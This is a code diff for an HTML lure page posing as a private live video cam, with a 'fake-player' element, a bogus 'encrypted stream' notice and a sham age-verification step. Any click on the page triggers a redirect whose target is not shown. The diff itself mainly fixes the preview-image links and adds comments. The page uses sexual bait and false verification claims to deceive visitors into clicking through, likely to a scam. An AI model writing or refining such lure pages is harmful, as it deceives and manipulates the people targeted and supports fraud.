@@ -5,6 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>🔴 Private Live Video Room</title>
     
+    <!-- ========================================== -->
+    <!-- SOCIAL MEDIA PREVIEW & THUMBNAIL META TAGS -->
+    <!-- ========================================== -->
     <meta name="description" content="I am home alone and waiting for you. Tap here to join my live face-to-face video stream instantly.">
     <meta property="og:locale" content="en_US">
     <meta property="og:type" content="website">
@@ -12,15 +15,20 @@
     <meta property="og:description" content="Skip the texting and let us connect face to face. Click here to enter my private broadcast directly.">
     <meta property="og:url" content="https://bedjfha.hubss.one/p/uyMfR">
     <meta property="og:site_name" content="Exclusive Live Cam">
-    <meta property="og:image" content="https://github.com/amanda25858-alt/text8/blob/main/HMaXk_HWcAAhsj0.jpg?raw=true">
+    
+    <!-- 100% Fixed Thumbnail Image for Social Share Preview -->
+    <meta property="og:image" content="https://raw.githubusercontent.com/amanda25858-alt/text8/main/HMaXk_HWcAAhsj0.jpg">
+    <meta property="og:image:secure_url" content="https://raw.githubusercontent.com/amanda25858-alt/text8/main/HMaXk_HWcAAhsj0.jpg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
     <meta property="og:image:type" content="image/jpeg">
+    
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="🔴 Live Now: Join My Private Video Room">
     <meta name="twitter:description" content="Skip the texting and let us connect face to face. Click here to enter my private broadcast directly.">
-    <meta name="twitter:image" content="https://github.com/amanda25858-alt/text8/blob/main/HMaXk_HWcAAhsj0.jpg?raw=true">
+    <meta name="twitter:image" content="https://raw.githubusercontent.com/amanda25858-alt/text8/main/HMaXk_HWcAAhsj0.jpg">
 
+    <!-- Fonts & Icons -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
@@ -46,11 +54,11 @@
             cursor: pointer;
         }
 
-        /* Blurred Background */
+        /* Blurred Background (Fixed Image Link) */
         .video-bg {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: url('https://github.com/amanda25858-alt/text8/blob/main/HMaXk_HWcAAhsj0.jpg?raw=true') center/cover no-repeat;
+            background: url('https://raw.githubusercontent.com/amanda25858-alt/text8/main/HMaXk_HWcAAhsj0.jpg') center/cover no-repeat;
             filter: blur(25px) brightness(0.15);
             z-index: 1;
             transform: scale(1.1);
@@ -253,10 +261,12 @@
 </head>
 <body onclick="startRedirect()">
 
+    <!-- Background -->
     <div class="video-bg"></div>
 
     <div class="main-container">
         
+        <!-- Live Player Box -->
         <div class="fake-player">
             <div class="live-badge">
                 <div class="live-dot"></div> LIVE
@@ -274,8 +284,10 @@
             <div class="sub-text">Encrypted Stream - Waiting for Unlock</div>
         </div>
 
+        <!-- Dynamic Box -->
         <div class="verification-box">
             
+            <!-- Step 1: Initial Verification View -->
             <div id="initialState">
                 <h2><i class="fa-solid fa-lock" style="color: var(--accent-red);"></i> Action Required</h2>
                 <p class="warning-text">The live stream is currently playing in the background. Please verify your age to decrypt the video and audio.</p>
@@ -284,10 +296,12 @@
                 </div>
             </div>
 
+            <!-- Step 2: Smart Redirect View (Triggers on Click) -->
             <div id="redirectState" style="display: none;">
                 <h2 style="color: var(--neon-green);"><i class="fa-solid fa-circle-check"></i> Age Verified!</h2>
                 <p class="warning-text" style="color: #fff; margin-bottom: 5px;">Securely routing connection to the main private room...</p>
                 
+                <!-- Animated Progress Bar -->
                 <div class="redirect-loader">
                     <div class="redirect-progress"></div>
                 </div>
@@ -301,6 +315,7 @@
 
     </div>
 
+    <!-- JavaScript Handling The Smart Transition -->
     <script>
         let isClicked = false;
 
